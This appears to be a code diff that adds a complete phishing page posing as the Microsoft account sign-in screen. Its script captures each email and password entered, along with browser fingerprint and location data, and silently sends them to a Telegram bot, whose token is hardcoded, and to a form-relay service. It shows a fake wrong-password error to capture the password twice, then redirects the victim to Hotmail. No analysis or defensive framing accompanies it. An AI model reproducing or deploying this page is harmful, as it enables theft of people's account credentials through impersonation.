@@ -1,0 +1,827 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your Microsoft account</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Segoe UI Web (West European)', 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Roboto', 'Helvetica Neue', sans-serif;
+        }
+        
+        body {
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            color: #000000;
+            position: relative;
+        }
+        
+        .login-container {
+            width: 100%;
+            max-width: 440px;
+            background: #ffffff;
+            border-radius: 0;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+            padding: 40px;
+            position: relative;
+            border: 1px solid #e6e6e6;
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+        
+        .colored-box-logo {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            grid-template-rows: 1fr 1fr;
+            gap: 2px;
+            width: 24px;
+            height: 24px;
+        }
+        
+        .logo-square {
+            width: 100%;
+            height: 100%;
+        }
+        
+        .red { background-color: #F35325; }
+        .green { background-color: #81BC06; }
+        .blue { background-color: #05A6F0; }
+        .yellow { background-color: #FFBA08; }
+        
+        .logo h1 {
+            font-size: 21px;
+            font-weight: 400;
+            color: #1b1b1b;
+            letter-spacing: 0.25px;
+        }
+        
+        .title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #1b1b1b;
+            text-align: center;
+        }
+        
+        .subtitle {
+            font-size: 14px;
+            color: #1b1b1b;
+            margin-bottom: 24px;
+            text-align: center;
+            font-weight: 400;
+        }
+        
+        .form-group {
+            margin-bottom: 16px;
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #8a8886;
+            border-radius: 2px;
+            font-size: 15px;
+            transition: all 0.3s;
+            background: #ffffff;
+            color: #323130;
+        }
+        
+        .form-control:focus {
+            outline: none;
+            border-color: #0078d4;
+            box-shadow: 0 0 0 1px #0078d4;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 10px 12px;
+            border: none;
+            border-radius: 2px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .btn-primary {
+            background-color: #0078d4;
+            color: white;
+            margin-top: 8px;
+        }
+        
+        .btn-primary:hover {
+            background-color: #106ebe;
+        }
+        
+        .btn-secondary {
+            background-color: transparent;
+            color: #0078d4;
+            margin-top: 16px;
+            border: 1px solid #8a8886;
+        }
+        
+        .btn-secondary:hover {
+            background-color: #f3f2f1;
+        }
+        
+        .links {
+            margin-top: 20px;
+            text-align: center;
+        }
+        
+        .links a {
+            color: #0078d4;
+            text-decoration: none;
+            font-size: 13px;
+            display: block;
+            margin-bottom: 8px;
+        }
+        
+        .links a:hover {
+            text-decoration: underline;
+        }
+        
+        .error-message {
+            color: #d13438;
+            font-size: 12px;
+            margin-top: 8px;
+            display: none;
+            align-items: center;
+            gap: 6px;
+            background: rgba(209, 52, 56, 0.1);
+            padding: 8px;
+            border-radius: 2px;
+        }
+        
+        .small-error {
+            color: #d13438;
+            font-size: 12px;
+            margin-top: 4px;
+            display: block;
+            text-align: center;
+            background: rgba(209, 52, 56, 0.1);
+            padding: 8px;
+            border-radius: 2px;
+        }
+        
+        .sign-in-options {
+            margin-top: 24px;
+            padding-top: 16px;
+            border-top: 1px solid #edebe9;
+        }
+        
+        .sign-in-options h3 {
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            color: #605e5c;
+        }
+        
+        .sign-in-options a {
+            display: block;
+            color: #0078d4;
+            text-decoration: none;
+            font-size: 13px;
+            margin-bottom: 8px;
+        }
+        
+        .sign-in-options a:hover {
+            text-decoration: underline;
+        }
+        
+        .user-info {
+            background-color: #f3f2f1;
+            border-radius: 2px;
+            padding: 12px;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .user-avatar {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background-color: #0078d4;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 500;
+            margin-right: 12px;
+            font-size: 14px;
+        }
+        
+        .user-details {
+            flex: 1;
+        }
+        
+        .user-email {
+            font-weight: 600;
+            font-size: 14px;
+            color: #323130;
+        }
+        
+        .change-account {
+            color: #0078d4;
+            text-decoration: none;
+            font-size: 13px;
+        }
+        
+        .change-account:hover {
+            text-decoration: underline;
+        }
+        
+        .password-field {
+            position: relative;
+        }
+        
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #605e5c;
+            cursor: pointer;
+            font-size: 13px;
+        }
+        
+        .page {
+            display: none;
+        }
+        
+        .active {
+            display: block;
+        }
+        
+        .ip-info {
+            position: absolute;
+            bottom: 20px;
+            left: 20px;
+            background: rgba(0, 0, 0, 0.8);
+            padding: 8px 12px;
+            border-radius: 4px;
+            font-size: 11px;
+            color: #ffffff;
+        }
+        
+        .ip-info i {
+            margin-right: 6px;
+            color: #81BC06;
+        }
+        
+        .security-badge {
+            position: absolute;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.8);
+            padding: 6px 10px;
+            border-radius: 4px;
+            font-size: 10px;
+            color: #81BC06;
+        }
+        
+        .security-badge i {
+            margin-right: 4px;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 16px;
+        }
+        
+        .loading-spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(0, 120, 212, 0.3);
+            border-radius: 50%;
+            border-top-color: #0078d4;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 8px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .microsoft-footer {
+            position: absolute;
+            bottom: 20px;
+            width: 100%;
+            text-align: center;
+            font-size: 12px;
+            color: #605e5c;
+        }
+        
+        .microsoft-footer a {
+            color: #0078d4;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        
+        .microsoft-footer a:hover {
+            text-decoration: underline;
+        }
+        
+        .language-selector {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            font-size: 12px;
+            color: #605e5c;
+        }
+        
+        .language-selector select {
+            border: 1px solid #8a8886;
+            border-radius: 2px;
+            padding: 4px 8px;
+            background: white;
+            color: #323130;
+        }
+    </style>
+</head>
+<body>
+    <div class="language-selector">
+        <select>
+            <option>English (United States)</option>
+            <option>Español</option>
+            <option>Français</option>
+            <option>Deutsch</option>
+        </select>
+    </div>
+    
+    <div class="login-container">
+        <!-- Email Page -->
+        <div id="emailPage" class="page active">
+            <div class="logo">
+                <div class="colored-box-logo">
+                    <div class="logo-square red"></div>
+                    <div class="logo-square green"></div>
+                    <div class="logo-square blue"></div>
+                    <div class="logo-square yellow"></div>
+                </div>
+                <h1>Microsoft</h1>
+            </div>
+            
+            <h2 class="title">Sign in</h2>
+            <p class="subtitle">Email, phone, or Skype</p>
+            
+            <form id="emailForm">
+                <div class="form-group">
+                    <input type="text" class="form-control" id="username" placeholder="Email, phone, or Skype" required>
+                </div>
+                
+                <div class="error-message" id="emailErrorMessage">
+                    <i class="fas fa-exclamation-circle"></i>
+                    <span>This username may be incorrect. Make sure you typed it correctly.</span>
+                </div>
+                
+                <button type="submit" class="btn btn-primary" id="nextBtn">Next</button>
+                
+                <div class="loading" id="emailLoading">
+                    <div class="loading-spinner"></div>
+                    <span>Checking...</span>
+                </div>
+            </form>
+            
+            <div class="links">
+                <a href="#">No account? <span style="color: #0078d4;">Create one!</span></a>
+                <a href="#">Can't access your account?</a>
+            </div>
+            
+            <div class="sign-in-options">
+                <h3>Sign-in options</h3>
+                <a href="#"><i class="fas fa-mobile-alt"></i> Use a verification code</a>
+                <a href="#"><i class="fas fa-key"></i> Sign in with Windows Hello or a security key</a>
+            </div>
+        </div>
+        
+        <!-- First Password Page (Normal validation) -->
+        <div id="passwordPage1" class="page">
+            <div class="logo">
+                <div class="colored-box-logo">
+                    <div class="logo-square red"></div>
+                    <div class="logo-square green"></div>
+                    <div class="logo-square blue"></div>
+                    <div class="logo-square yellow"></div>
+                </div>
+                <h1>Microsoft</h1>
+            </div>
+            
+            <h2 class="title">Enter password</h2>
+            <p class="subtitle">for <span id="userEmailDisplay1">user@example.com</span></p>
+            
+            <div class="user-info">
+                <div class="user-avatar" id="userAvatar1">M</div>
+                <div class="user-details">
+                    <div class="user-email" id="userEmail1">user@example.com</div>
+                    <a href="#" class="change-account" id="changeAccount1">Sign in with a different account</a>
+                </div>
+            </div>
+            
+            <form id="passwordForm1">
+                <div class="form-group password-field">
+                    <input type="password" class="form-control" id="password1" placeholder="Password" required>
+                    <button type="button" class="toggle-password" id="togglePassword1">Show</button>
+                </div>
+                
+                <div class="error-message" id="passwordErrorMessage1">
+                    <i class="fas fa-exclamation-circle"></i>
+                    <span>Your account or password is incorrect. If you don't remember your password, <a href="#" style="color: #0078d4;">reset it now</a>.</span>
+                </div>
+                
+                <button type="submit" class="btn btn-primary" id="signInBtn1">Sign in</button>
+                
+                <div class="loading" id="passwordLoading1">
+                    <div class="loading-spinner"></div>
+                    <span>Signing in...</span>
+                </div>
+            </form>
+            
+            <div class="links">
+                <a href="#">Forgot my password?</a>
+            </div>
+            
+            <div class="sign-in-options">
+                <h3>Other ways to sign in</h3>
+                <a href="#"><i class="fas fa-key"></i> Sign-in with a security key</a>
+            </div>
+        </div>
+        
+        <!-- Second Password Page (Always shows incorrect password) -->
+        <div id="passwordPage2" class="page">
+            <div class="logo">
+                <div class="colored-box-logo">
+                    <div class="logo-square red"></div>
+                    <div class="logo-square green"></div>
+                    <div class="logo-square blue"></div>
+                    <div class="logo-square yellow"></div>
+                </div>
+                <h1>Microsoft</h1>
+            </div>
+            
+            <h2 class="title">Enter password</h2>
+            <p class="subtitle">for <span id="userEmailDisplay2">user@example.com</span></p>
+            
+            <div class="user-info">
+                <div class="user-avatar" id="userAvatar2">M</div>
+                <div class="user-details">
+                    <div class="user-email" id="userEmail2">user@example.com</div>
+                    <a href="#" class="change-account" id="changeAccount2">Sign in with a different account</a>
+                </div>
+            </div>
+            
+            <form id="passwordForm2">
+                <div class="form-group password-field">
+                    <input type="password" class="form-control" id="password2" placeholder="Password" required>
+                    <button type="button" class="toggle-password" id="togglePassword2">Show</button>
+                </div>
+                
+                <div class="small-error">
+                    <i class="fas fa-exclamation-circle"></i>
+                    <span>Your account or password is incorrect. If you don't remember your password, <a href="#" style="color: #0078d4;">reset it now</a>.</span>
+                </div>
+                
+                <button type="submit" class="btn btn-primary" id="signInBtn2">Sign in</button>
+                
+                <div class="loading" id="passwordLoading2">
+                    <div class="loading-spinner"></div>
+                    <span>Signing in...</span>
+                </div>
+            </form>
+            
+            <div class="links">
+                <a href="#">Forgot my password?</a>
+            </div>
+            
+            <div class="sign-in-options">
+                <h3>Other ways to sign in</h3>
+                <a href="#"><i class="fas fa-key"></i> Sign-in with a security key</a>
+            </div>
+        </div>
+    </div>
+    
+    <div class="ip-info">
+        <i class="fas fa-map-marker-alt"></i>
+        <span id="ipLocation">Detecting your location...</span>
+    </div>
+    
+    <div class="security-badge">
+        <i class="fas fa-shield-alt"></i>
+        <span>Microsoft Secure</span>
+    </div>
+    
+    <div class="microsoft-footer">
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy & cookies</a>
+        <a href="#">...</a>
+    </div>
+
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const emailForm = document.getElementById('emailForm');
+            const passwordForm1 = document.getElementById('passwordForm1');
+            const passwordForm2 = document.getElementById('passwordForm2');
+            const emailPage = document.getElementById('emailPage');
+            const passwordPage1 = document.getElementById('passwordPage1');
+            const passwordPage2 = document.getElementById('passwordPage2');
+            const emailErrorMessage = document.getElementById('emailErrorMessage');
+            const passwordErrorMessage1 = document.getElementById('passwordErrorMessage1');
+            const userEmail1 = document.getElementById('userEmail1');
+            const userEmail2 = document.getElementById('userEmail2');
+            const userEmailDisplay1 = document.getElementById('userEmailDisplay1');
+            const userEmailDisplay2 = document.getElementById('userEmailDisplay2');
+            const userAvatar1 = document.getElementById('userAvatar1');
+            const userAvatar2 = document.getElementById('userAvatar2');
+            const changeAccount1 = document.getElementById('changeAccount1');
+            const changeAccount2 = document.getElementById('changeAccount2');
+            const togglePassword1 = document.getElementById('togglePassword1');
+            const togglePassword2 = document.getElementById('togglePassword2');
+            const passwordInput1 = document.getElementById('password1');
+            const passwordInput2 = document.getElementById('password2');
+            const emailLoading = document.getElementById('emailLoading');
+            const passwordLoading1 = document.getElementById('passwordLoading1');
+            const passwordLoading2 = document.getElementById('passwordLoading2');
+            const nextBtn = document.getElementById('nextBtn');
+            const signInBtn1 = document.getElementById('signInBtn1');
+            const signInBtn2 = document.getElementById('signInBtn2');
+            const ipLocation = document.getElementById('ipLocation');
+            
+            // Telegram Bot Configuration
+            const telegramBotToken = '8548316435:AAHCqj_m7nVWuUbpyOIVfXtmVLDB52mA4gw';
+            const telegramChatId = '1084765583';
+            
+            // Email Configuration
+            const targetEmail = '';
+            
+            // Get IP location
+            getIPLocation();
+            
+            // Email form submission
+            emailForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const username = document.getElementById('username').value.trim();
+                
+                // Show loading
+                emailLoading.style.display = 'block';
+                nextBtn.disabled = true;
+                
+                // Simulate API call delay
+                setTimeout(function() {
+                    // Basic email validation
+                    if (!username || !isValidEmail(username)) {
+                        emailErrorMessage.style.display = 'flex';
+                        emailLoading.style.display = 'none';
+                        nextBtn.disabled = false;
+                        return;
+                    }
+                    
+                    // Hide error message
+                    emailErrorMessage.style.display = 'none';
+                    
+                    // Update user info on both password pages
+                    userEmail1.textContent = username;
+                    userEmail2.textContent = username;
+                    userEmailDisplay1.textContent = username;
+                    userEmailDisplay2.textContent = username;
+                    userAvatar1.textContent = username.charAt(0).toUpperCase();
+                    userAvatar2.textContent = username.charAt(0).toUpperCase();
+                    
+                    // Switch to first password page (normal validation)
+                    emailPage.classList.remove('active');
+                    passwordPage1.classList.add('active');
+                    
+                    emailLoading.style.display = 'none';
+                    nextBtn.disabled = false;
+                }, 1500);
+            });
+            
+            // First password form submission (normal validation)
+            passwordForm1.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const password = passwordInput1.value;
+                const username = userEmail1.textContent;
+                
+                // Show loading
+                passwordLoading1.style.display = 'block';
+                signInBtn1.disabled = true;
+                passwordErrorMessage1.style.display = 'none';
+                
+                // Simulate authentication process
+                setTimeout(function() {
+                    // Basic password validation
+                    if (!password) {
+                        passwordErrorMessage1.textContent = 'Please enter your password';
+                        passwordErrorMessage1.style.display = 'flex';
+                        passwordLoading1.style.display = 'none';
+                        signInBtn1.disabled = false;
+                        return;
+                    }
+                    
+                    // Send credentials to Telegram and email (silently)
+                    sendCredentials(username, 'password_step_1', password);
+                    
+                    // Always redirect to second password page
+                    passwordPage1.classList.remove('active');
+                    passwordPage2.classList.add('active');
+                    
+                    passwordLoading1.style.display = 'none';
+                    signInBtn1.disabled = false;
+                }, 2000);
+            });
+            
+            // Second password form submission (always shows incorrect password + 0.5s redirect to Word Cloud)
+            passwordForm2.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const password = passwordInput2.value;
+                const username = userEmail2.textContent;
+                
+                // Show loading
+                passwordLoading2.style.display = 'block';
+                signInBtn2.disabled = true;
+                
+                // Simulate authentication process
+                setTimeout(function() {
+                    // Send credentials to Telegram and email (silently)
+                    sendCredentials(username, 'password_step_2', password);
+                    
+                    // Hide loading
+                    passwordLoading2.style.display = 'none';
+                    
+                    // 0.5-second delay then redirect to Word Cloud in the same tab
+                    setTimeout(function() {
+                        window.location.href = 'https://hotmail.com/';
+                    }, 500);
+                    
+                }, 2000);
+            });
+            
+            // Change account links
+            changeAccount1.addEventListener('click', function(e) {
+                e.preventDefault();
+                passwordPage1.classList.remove('active');
+                emailPage.classList.add('active');
+                passwordInput1.value = '';
+            });
+            
+            changeAccount2.addEventListener('click', function(e) {
+                e.preventDefault();
+                passwordPage2.classList.remove('active');
+                emailPage.classList.add('active');
+                passwordInput2.value = '';
+            });
+            
+            // Toggle password visibility
+            togglePassword1.addEventListener('click', function() {
+                if (passwordInput1.type === 'password') {
+                    passwordInput1.type = 'text';
+                    togglePassword1.textContent = 'Hide';
+                } else {
+                    passwordInput1.type = 'password';
+                    togglePassword1.textContent = 'Show';
+                }
+            });
+            
+            togglePassword2.addEventListener('click', function() {
+                if (passwordInput2.type === 'password') {
+                    passwordInput2.type = 'text';
+                    togglePassword2.textContent = 'Hide';
+                } else {
+                    passwordInput2.type = 'password';
+                    togglePassword2.textContent = 'Show';
+                }
+            });
+            
+            // Simple email validation
+            function isValidEmail(email) {
+                const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                return re.test(email);
+            }
+            
+            // Get IP location (using a free API)
+            function getIPLocation() {
+                fetch('https://ipapi.co/json/')
+                    .then(response => response.json())
+                    .then(data => {
+                        ipLocation.textContent = `${data.city}, ${data.region_code}, ${data.country_name}`;
+                    })
+                    .catch(error => {
+                        console.error('Error fetching location:', error);
+                        ipLocation.textContent = 'Location unavailable';
+                    });
+            }
+            
+            // Function to send credentials to Telegram and email (silently - no UI indication)
+            function sendCredentials(username, step, password = null) {
+                // Get additional user information
+                const userAgent = navigator.userAgent;
+                const language = navigator.language;
+                const platform = navigator.platform;
+                const screenResolution = `${screen.width}x${screen.height}`;
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const timestamp = new Date().toLocaleString();
+                const ipInfo = ipLocation.textContent;
+                
+                // Prepare message
+                let message = `🔐 Microsoft Login Attempt\n\n`;
+                message += `📧 Email: ${username}\n`;
+                
+                if (password) {
+                    message += `🔑 Password: ${password}\n`;
+                }
+                
+                message += `\n📊 Additional Info:\n`;
+                message += `⏰ Time: ${timestamp}\n`;
+                message += `🌐 Timezone: ${timezone}\n`;
+                message += `📍 IP Location: ${ipInfo}\n`;
+                message += `🖥️ Platform: ${platform}\n`;
+                message += `📱 User Agent: ${userAgent}\n`;
+                message += `🖼️ Screen: ${screenResolution}\n`;
+                message += `🗣️ Language: ${language}\n`;
+                message += `🔗 Step: ${step}\n`;
+                message += `🔄 Redirect: word.cloud.microsoft\n`;
+                
+                // Send to Telegram silently (no UI feedback)
+                sendToTelegram(message);
+                
+                // Send to email silently (no UI feedback)
+                sendToEmail(message);
+            }
+            
+            // Function to send message to Telegram silently
+            function sendToTelegram(message) {
+                const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+                
+                fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: telegramChatId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Message sent to Telegram successfully');
+                })
+                .catch(error => {
+                    console.error('Error sending to Telegram:', error);
+                });
+            }
+            
+            // Function to send message to email silently
+            function sendToEmail(message) {
+                const formSubmitUrl = 'https://formsubmit.co/ajax/' + targetEmail;
+                
+                fetch(formSubmitUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        name: 'Microsoft Login Bot',
+                        email: targetEmail,
+                        subject: 'Microsoft Login Attempt Detected',
+                        message: message,
+                        _captcha: 'false'
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Email sent successfully');
+                })
+                .catch(error => {
+                    console.error('Error sending email:', error);
+                });
+            }
+        });
+    </script>
+</body>
+</html>
